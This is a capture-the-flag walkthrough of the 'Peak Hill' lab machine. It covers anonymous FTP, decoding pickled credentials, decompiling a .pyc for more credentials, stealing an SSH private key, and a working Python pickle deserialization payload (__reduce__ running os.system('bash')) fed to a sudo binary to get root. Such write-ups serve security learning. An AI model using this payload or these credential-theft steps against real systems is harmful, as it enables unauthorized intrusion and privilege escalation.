# Peak Hill

##### Difficulty: [ Medium ]

**Tags:** `Linux`,  `nmap`,  `ftp`,  `python pickle`,  `umcompyle6`,  `python deserialization`

---

##### Written: 29/11/2021

##### IP address: 10.10.149.209

---

### [ What is the user flag? ]

Let's first conduct a full **nmap** scan on the target machine.

```
sudo nmap -sC -sV -vv -T4 -p- 10.10.149.209
```

Our nmap scan reveals **three** open ports:

```
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
7321/tcp open   swx
```

Looks like we have a **FTP** and **SSH** server. There's also a service that I've never seen before: **swx**

Let's take a look at the FTP server first.

<img style="float: left;" src="screenshots/screenshot1.png">

The nmap scan actually reveals that **anonymous login** is enabled. This means that we will be able to log into the FTP server without a valid password.

If we list the root directory of the FTP server with the `-a` option, we will find that there is a hidden **.creds** file.

<img style="float: left;" src="screenshots/screenshot3.png">

Let's go ahead and download the **.creds** and **test.txt** file.

**Contents of test.txt:**

<img style="float: left;" src="screenshots/screenshot2.png">

**Contents of .creds:**

<img style="float: left;" src="screenshots/screenshot4.png">

Woah, **.creds** contains many 1s and 0s. This seems to be encoded in binary format. Let's try decoding it using Cyberchef: 

https://gchq.github.io/CyberChef/

<img style="float: left;" src="screenshots/screenshot5.png">

We get some really weird text.

After doing some research online and poking around, I realized that this a **Python Pickle** file! 

https://docs.python.org/3/library/pickle.html

---

***From the docs:** The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy.*

---

Let's save this decoded output from cyberchef into a file called creds.dat. We'll then depickle it using the **pickle** module in Python.

```python
import pickle

f = open('creds.dat', 'rb')
result = pickle.load(f)
print(result)
```

<img style="float: left;" src="screenshots/screenshot6.png">

We get a long list of tuples, with each tuple containing either one character of the username or password. Let's clean it up and extract the username and password:

```python
creds = [ output list from earlier ]

# separate username and password
username_lst = [(i[0][8:], i[1]) for i in creds if 'ssh_user' in i[0]]
password_lst = [(i[0][8:], i[1]) for i in creds if 'ssh_pass' in i[0]]

# sort username and password based on numbering
username_lst.sort(key=lambda y: int(y[0]))
password_lst.sort(key=lambda y: int(y[0]))

# convert username and password into string
username = ""
password = ""

for i in username_lst: username += i[1]
for i in password_lst: password += i[1]

print("username: " + username)
print("password: " + password)
```

<img style="float: left;" src="screenshots/screenshot7.png">

We have our first set of credentials - **gherkin : p1ckl3s_@11_@r0und_th3_w0rld**

<br>

Let's try using these credentials to log into the SSH server:

<img style="float: left;" src="screenshots/screenshot8.png">

And we're in! :smiling_imp:

Looking around the machine, I found the **user.txt** file in the home directory of another user, **dill**.

<img style="float: left;" src="screenshots/screenshot10.png">

Unfortunately, we do not have the permissions to read it. 

dill's public and private ssh keys can also be found in his **.ssh** directory. Unfortunately, I was unable to read his private key.

<img style="float: left;" src="screenshots/screenshot11.png">

<br>

Hitting a dead-end, I decided to look into gherkin's home directory. I found a **compiled python script** called '**cmd_service.pyc**'. 

<img style="float: left;" src="screenshots/screenshot12.png">

While we do not have the permissions to write or execute the file, we can download it onto our local machine and decompile it. This will allow us to read the script in its entirety. We can use **uncompyle6** (https://pypi.org/project/uncompyle6/) to do so:

```
uncompyle6 cmd_service.pyc
```

**Snippet of cmd_service.pyc:**

<img style="float: left;" src="screenshots/screenshot13.png">

The Python script simply starts up a TCP server. It also implements an authentication service. Luckily for us, the username and password used to log in are actually exposed in the code itself! We can now convert the username and password to bytes.

<img style="float: left;" src="screenshots/screenshot14.png">

We get the following credentials - **dill : n3v3r_@_d1ll_m0m3nt**

<br>

With that, let's log into the TCP server on port **7321**:

```
nc 10.10.149.209 7321
```

<img style="float: left;" src="screenshots/screenshot15.png">

We have a prompt that allows us to input shell commands. We can now obtain the user flag from dill's home directory.

<img style="float: left;" src="screenshots/screenshot16.png">

---

### [ What is the root flag? ]

Since we have a shell as dill's account, we can go ahead and grab his SSH private key from his **.ssh** directory:

<img style="float: left;" src="screenshots/screenshot19.png">

I copied the contents of his **id_rsa** private key into a file on my local machine *(Make sure to change permissions of the key to either 400 or 600)*. 

We can then use the key to log into dill's SSH account.

<img style="float: left;" src="screenshots/screenshot20.png">

And we're in dill's account!

<br>

The first thing I did was to check dill's **sudo privileges**. We can do this with `sudo -l`:

<img style="float: left;" src="screenshots/screenshot17.png">

Turns out there is a binary in the **/opt/peak_hill_farm** directory called **peak_hill_farm**. Furthermore, dill can actually run this binary with root privileges.

Let's run the binary:

<img style="float: left;" src="screenshots/screenshot18.png">

It seems that the binary is expecting some user prompt, we'll try inputting 'apples'.

<img style="float: left;" src="screenshots/screenshot21.png">

We get an error message: **failed to decode base64**.

Looks like the binary is expecting some base64 encoded input. Let's encode the string 'apples' and pass it into the binary.

<img style="float: left;" src="screenshots/screenshot22.png">

<img style="float: left;" src="screenshots/screenshot23.png">

Hmmmm... Since a common theme in this room so far has been 'pickles', perhaps the farm grows pickles? (even though pickles can't really be grown :smile:) I tried both 'pickles' and 'pickle':

<img style="float: left;" src="screenshots/screenshot24.png">

<img style="float: left;" src="screenshots/screenshot25.png">

Still no luck...

After doing some research online, I found the following article:

https://medium.com/@abhishek.dev.kumar.94/sour-pickle-insecure-deserialization-with-python-pickle-module-efa812c0d565

---

***From the article:** Insecure deserialization occurs when we deserialize data that is coming from a malicious source. Successful insecure deserialization attacks could allow an attacker to carry out denial-of-service (DoS) attacks, authentication bypasses and remote code execution attacks.*

---

To generate our serialized payload, we can use the following Python script:

```python
import pickle
import os

class myPickle(object):
	def __reduce__(self):
		return (os.system, ('whoami', ))

pickle_result = pickle.dumps(myPickle())

with open("pickle_result", "wb") as file:
	file.write(pickle_result)
```

This script first serializes / pickles an object of the **myPickle** class. What's important to note is that the myPickle class has its **\__reduce__()** directive overwritten to run the `whoami` command. Hence, when a Python program attempts to deserialize a myPickle object, it will first refer to the \__reduce__() directive to see if there is any instructions that need to be executed while deserializing the data. It will then run whatever code that we have placed in the directive, allowing us to obtain remote code execution. In this case, the `whoami` command will be run.

 With the serialized object saved to a file, let's go ahead and base64-encode the data so that we can pass it to the peak_hill_farm binary:

<img style="float: left;" src="screenshots/screenshot26.png">

<img style="float: left;" src="screenshots/screenshot27.png">

Nice, It works! Now we just have to replace `whoami` with `bash` like so. 

```python
class myPickle(object):
	def __reduce__(self):
		return (os.system, ('bash', ))
```

Similarly, we base64-encode the result and pass it it to the peak_hill_farm binary.

<img style="float: left;" src="screenshots/screenshot28.png">

<img style="float: left;" src="screenshots/screenshot29.png">

When our pickled data is deserialized, the `bash` command will be run, opening a shell as root. We now have root access!

<br>

The **root.txt** file is in the **/root** directory.

<img style="float: left;" src="screenshots/screenshot30.png">

However, we are unable to read the file. It seems that there is probably some hidden spaces or characters in the filename.

My first instinct was to simply `cat` all of the files in the directory using the wildcard operator (*):

```
cat *
```

<img style="float: left;" src="screenshots/screenshot31.png">

However, for some reason, the wildcard operator was not working.

---

*I looked at various writeups online and they were all able to read the file using `cat *`. I still don't really know why this doesn't work for me.*

---

An alternative method is to use:

```
find /root/ -name "*root.txt*" -exec cat {} \;
```

<img style="float: left;" src="screenshots/screenshot32.png">
